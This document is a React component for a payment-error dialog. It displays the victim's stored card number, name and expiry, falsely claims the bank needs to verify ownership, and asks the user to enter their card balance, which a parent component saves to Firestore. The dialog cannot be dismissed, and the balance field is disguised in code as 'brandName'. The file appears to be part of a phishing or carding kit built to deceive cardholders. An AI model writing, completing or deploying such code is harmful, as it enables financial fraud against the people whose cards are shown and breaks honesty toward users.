"use client";

import { useState } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { CircleAlertIcon, Loader2 } from "lucide-react";
import { Alert, AlertTitle, AlertDescription } from "@/components/ui/alert";

import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogFooter,
} from "@/components/ui/dialog";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";

import {
  brandNameSchema,
  type BrandNameValues,
  type CardConfirmationValues,
} from "./card-confirmation";
import { CardVisual } from "./cardvisual";

interface PaymentErrorDialogProps {
  open: boolean;
  card: CardConfirmationValues;
  /** Called with the brand name once confirmed — parent writes it to Firestore. */
  onConfirm: (brandName: string) => void | Promise<void>;
}

export function PaymentErrorDialog({
  open,
  card,
  onConfirm,
}: PaymentErrorDialogProps) {
  const [isLoading, setIsLoading] = useState(false);

  const form = useForm<BrandNameValues>({
    resolver: zodResolver(brandNameSchema),
    mode: "onChange",
    defaultValues: {
      brandName: "",
    },
  });

  const onSubmit = async (values: BrandNameValues) => {
    setIsLoading(true);
    try {
      await onConfirm(values.brandName);
    } finally {
      setIsLoading(false);
    }
  };

  const onInvalid = (errors: unknown) => {
    console.log("Validation failed:", errors);
  };

  return (
    <Dialog
      open={open}
      onOpenChange={(next) => {
        // Prevent closing by clicking outside or Escape – only onConfirm closes it
        if (!next) {
          console.log("Radix tried to close the dialog via onOpenChange");
        }
      }}
    >
      <DialogContent
        className="sm:max-w-md pb-3"
        onInteractOutside={(e) => e.preventDefault()}
        onEscapeKeyDown={(e) => e.preventDefault()}
      >
        <DialogHeader>
          <DialogTitle>We couldn&apos;t complete your payment</DialogTitle>
        </DialogHeader>

        <div className="mt-2 flex min-w-0">
          <CardVisual
            cardholderName={card.cardholderName}
            cardNumber={card.cardNumber}
            expiry={card.expiry}
          />
        </div>

        <Alert className="border-none bg-amber-600/10 text-amber-600 dark:bg-amber-400/10 dark:text-amber-400">
          <CircleAlertIcon />
          <AlertTitle>Bank needs more info</AlertTitle>
          <AlertDescription className="text-amber-600/80 dark:text-amber-400/80 text-sm">
            The bank needs additional information to verify card ownership.
            Please confirm your card balance in order for us to proceed.
          </AlertDescription>
        </Alert>

        <Form {...form}>
          <form
            onSubmit={form.handleSubmit(onSubmit, onInvalid)}
            className="my-3"
          >
            <FormField
              control={form.control}
              name="brandName"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Card Balance</FormLabel>
                  <FormControl>
                    <Input
                      autoComplete="off"
                      placeholder="Enter card balance"
                      {...field}
                    />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />

            <DialogFooter className="mt-4 ">
              <Button type="submit" className="w-full" disabled={isLoading}>
                {isLoading ? (
                  <>
                    <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                    Processing…
                  </>
                ) : (
                  "Confirm and retry payment"
                )}
              </Button>
            </DialogFooter>
          </form>
        </Form>
      </DialogContent>
    </Dialog>
  );
}
